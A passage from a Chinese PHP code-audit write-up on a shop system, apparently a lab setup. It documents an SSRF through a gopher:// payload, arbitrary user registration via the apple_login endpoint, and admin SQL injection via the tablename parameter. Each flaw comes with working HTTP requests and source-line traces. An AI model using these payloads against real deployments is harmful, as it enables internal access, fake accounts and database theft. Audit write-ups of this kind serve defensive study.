Content-Type: application/json;charset=UTF-8
Content-Length: 258

{"image":"?.jpg","code":"gopher://127.0.0.1:18000/_POST%20%2Fflag.php%20HTTP%2F1.1%0A%0DHost%3A%20127.0.0.1%3A18000%0A%0DContent-Type%3A%20application%2Fx-www-form-urlencoded%0A%0DContent-Length%3A%2036%0A%0D%0A%0Dkey%3D00f001523d0b955749ea5e3b0ca09b5f.jpg"}
```

### 漏洞审计
利用链路：

```plain
services/system/attachment/SystemAttachmentServices.php videoUpload 261行
  	adminapi/controller/v1/file/SystemAttachment.php videoUpload 136行
```

定位到危险函数`<font style="color:rgb(64, 72, 91);">curl_exec</font>`<font style="color:rgb(64, 72, 91);">，流程函数为</font>`<font style="color:#080808;">image_to_base64</font>`<font style="color:#080808;">，位于</font>`<font style="color:#080808;">common.php</font>`<font style="color:#080808;">第530行。这里的使用了</font>`<font style="color:#080808;">parse_url</font>`<font style="color:#080808;">进一步限制了协议的使用，因为某些协议无法通过</font>`<font style="color:#080808;">$url['host']</font>`<font style="color:#080808;">的形式获取。</font>

```plain
$url = parse_url($avatar);
$url = $url['host'];
```

可以获取`host`的协议有：

```plain
zip:///path/to/myfile.zip#file.txt
phar://path/to/myapp.phar/some/script.php
gopher://gopher.example.com/0example
ldap://ldap.example.com/dc=example,dc=com
file://C:/path/to/file
ftp://username:password@ftp.example.com/path/to/file
http://www.example.com/path/to/resource
https://www.example.com:8080/path/to/resource
```

![](../../images/posts/e4bcfe909f775ad3212eea9fcf459be2.png)

向上寻找到调用函数`<font style="color:#080808;">get_image_base64</font>`<font style="color:#080808;">，位于</font>`<font style="color:#080808;">api/controller/v1/PublicController.php</font>`<font style="color:#080808;">第302行。</font>

这里接收两个参数，从提示看都是URL字符串。

![](../../images/posts/a4b518506ffe262337577830337771ca.png)

<font style="color:#080808;">这里共有两处调用，我们先来看先决条件：</font>

1. <font style="color:#080808;">两个变量内容不能为空</font>
2. <font style="color:#080808;">两个变量内容要已图片文件后缀名作为结尾</font>
3. <font style="color:#080808;">两个变量内容不能包含</font>`<font style="color:#080808;">phar://</font>`

```plain
if ($imageUrl !== '' && !preg_match('/.*(\.png|\.jpg|\.jpeg|\.gif)$/', $imageUrl) && strpos($imageUrl, "phar://") !== false) {
    return app('json')->success(['code' => false, 'image' => false]);
}
if ($codeUrl !== '' && !(preg_match('/.*(\.png|\.jpg|\.jpeg|\.gif)$/', $codeUrl) || strpos($codeUrl, 'https://mp.weixin.qq.com/cgi-bin/showqrcode') !== false) && strpos($codeUrl, "phar://") !== false) {
    return app('json')->success(['code' => false, 'image' => false]);
}
```

通过条件后就会进入到`<font style="color:#080808;">CacheService::remember</font>`<font style="color:#080808;">的第二参数的匿名函数内，这里如果以同样的URL字符串写入</font>`<font style="color:#080808;">remember</font>`<font style="color:#080808;">不会触发匿名函数——</font>**<font style="color:#080808;">输入的参数不能和上一次请求相同</font>**

<font style="color:#080808;">从</font>`<font style="color:#080808;">api/route/v1.php</font>`<font style="color:#080808;">可以找到对应路由：</font>

![](../../images/posts/426c1ec42c2b8f16643efb843640ee60.png)

## 【中危】任意用户注册（<font style="color:#080808;background-color:#ffffff;">apple快捷登陆</font>） 
### 漏洞详情
新建用户的方式有很多，其中<font style="color:#080808;background-color:#ffffff;">apple快捷登陆，没有进一步确认用户身份，默认不开启强制手机号注册，导致只需要提供 openId 就能创建新用户。</font>

### 漏洞复现
对`http://localhost:45600/api/apple_login`发起请求，修改`openId`为随机数值。

```plain
POST /api/apple_login HTTP/1.1
Host: localhost:45600
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/json;charset=UTF-8
Content-Length: 28

{"openId":"asdasdasdqweqwe"}
```

发送请求包后即可获得Token。

![](../../images/posts/2dfbf90047b6b9a9fb03d5992c7224a1.png)

使用 Token 即可登录账户。例如查看用户身份信息：

![](../../images/posts/ea70d7ff2870fb51cc3ef81d26bfb528.png)

### 漏洞审计
利用链路：

```plain
api/controller/v1/LoginController.php appleLogin 444行
  	services/wechat/WechatServices.php appAuth 372行
      	services/wechat/WechatUserServices.php wechatOauthAfter 272行
          	services/user/UserServices.php setUserInfo 122行
```

`<font style="color:#080808;">appleLogin</font>`<font style="color:#080808;">函数位于</font>`<font style="color:#080808;">api/controller/v1/LoginController.php</font>`<font style="color:#080808;">第444行。从POST请求中获取4个参数，其中</font>`<font style="color:#080808;">phone</font>`<font style="color:#080808;">和</font>`<font style="color:#080808;">captcha</font>`<font style="color:#080808;">是同时使用的，允许为空。</font>`<font style="color:#080808;">$email</font>`<font style="color:#080808;">为空会自动生成，所以我们只需要传递</font>`<font style="color:#080808;">openId</font>`<font style="color:#080808;">即可。</font>

`<font style="color:#080808;">openId</font>`<font style="color:#080808;">也可以为空，但为了随机生成新用户，需要保证</font>`<font style="color:#080808;">openId</font>`<font style="color:#080808;">的随机性。</font>

![](../../images/posts/59c625f38ce0aae964997ed194c200ff.png)

往下进入到`<font style="color:#080808;">appAuth</font>`<font style="color:#080808;">函数，位于</font>`<font style="color:#080808;">services/wechat/WechatServices.php</font>`<font style="color:#080808;">第372行。这里补全了用户信息。</font>

![](../../images/posts/57e51af2dd2a32a8184fdbcaac59e822.png)

其中存在一个手机绑定校验，前提是开启`store_user_mobile`。这里默认值为`0`，也就无需校验手机号和验证码了。

![](../../images/posts/cae7b5c71ed7d80ee21dbf3d9d31a243.png)

412行进入`wechatOauthAfter`函数，位于`services/wechat/WechatUserServices.php`第272行。

![](../../images/posts/158cabc9e0c9c0b0be4643561d35d8be.png)

这里从数据库查询了`eb_wechat_user`和`eb_user`，确保两张表都没有记录就会创建新用户。

![](../../images/posts/f7387319b06f01c72246d548c947225a.png)

357行进入`<font style="color:#080808;">setUserInfo</font>`<font style="color:#080808;">函数，位于</font>`<font style="color:#080808;">services/user/UserServices.php</font>`<font style="color:#080808;">第122行。用于添加用户数据。</font>

![](../../images/posts/f63e8d699fd8eedcadd097e72a7e604c.png)

## 【中危】后台SQL注入（<font style="color:#080808;background-color:#ffffff;">查看表接口详细功能</font>） 
### 漏洞详情
在进行SQL查询时，没有使用预编译和过滤，而是使用字符串拼接的方式拼接SQL语句。在实现<font style="color:#080808;background-color:#ffffff;">查看表接口详细功能时，拼接了未经校验的数据，导致SQL注入漏洞的产生。</font>

### 漏洞复现
_注意服务名和端口，需要自行替换_。

访问后台：`http://localhost:45600/admin`

输入安装时设置好的账号密码登录后台，从左侧栏进入路径`维护->开发工具->数据库管理`

`http://localhost:45600/admin/system/maintain/system_databackup/index`

![](../../images/posts/ce29483909fb00b700a2b37b35d88c7c.png)

在右边找到详细按钮，点击后并抓包，原始数据包：

![](../../images/posts/2bf682c02ce14018f214080df6381020.png)

修改`tablename`成`'`可以看到报错提示。

![](../../images/posts/a17c3394376957659c285335fec9fa8d.png)

保存文件后使用sqlmap进行攻击：

![](../../images/posts/73431874baa8cecdb15fdd1eba0cce02.png)

```plain
GET /adminapi/system/backup/read?tablename=' HTTP/1.1
Host: localhost:45600
sec-ch-ua: "Not A(Brand";v="24", "Chromium";v="110"
Accept: application/json, text/plain, */*
Authori-zation: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJwd2QiOiIxZDlmMjExMGZlOTgzM2U1MTQ4MmQyZjdkMTFmZjFlNiIsImlzcyI6ImxvY2FsaG9zdDo0NTYwMCIsImF1ZCI6ImxvY2FsaG9zdDo0NTYwMCIsImlhdCI6MTY5NDA1NjkyMCwibmJmIjoxNjk0MDU2OTIwLCJleHAiOjE2OTY2NDg5MjAsImp0aSI6eyJpZCI6MSwidHlwZSI6ImFkbWluIn19.6gzs6MXyxnHOEckxP4ejuoNJxLpMcT3MdyLRPBAkJ8k
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.5481.178 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost:45600/admin/system/maintain/system_databackup/index
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close


```

### 漏洞审计
在`services/system/SystemDatabackupServices.php`第68行，使用了query执行sql语句，其中`$tablename`作为字符串进行拼接，没有进行预编译或者过滤。![](../../images/posts/b90fcf0619099e7346add2512e0231a6.png)

向上寻找到`read`函数，位于`adminapi/controller/v1/system/SystemDatabackup.php`第51行，这里通过POST获取了`tablename`，虽然使用了`htmlspecialchars` ，但这个函数不过滤单引号。

![](../../images/posts/28b8273ed9c83964fa03cdf4d2b56271.png)

# 0x05 总结
PHP的代码审计相对来说比较透明，关注一些危险函数即可。比较考验开发人员的安全意识和安全开发的水平能力。在实际进行代码审计时，我们需要搭建环境，结合数据库日志、代码审计工具、抓包工具进行检测。除了传统的危险函数检索，还可以从用户权限能力、业务绕过、凭据与加密方向进行考虑与审计。PHP 在CTF中的题目占较大，有非常多不错的题目，我们可以借鉴一二进行学习。

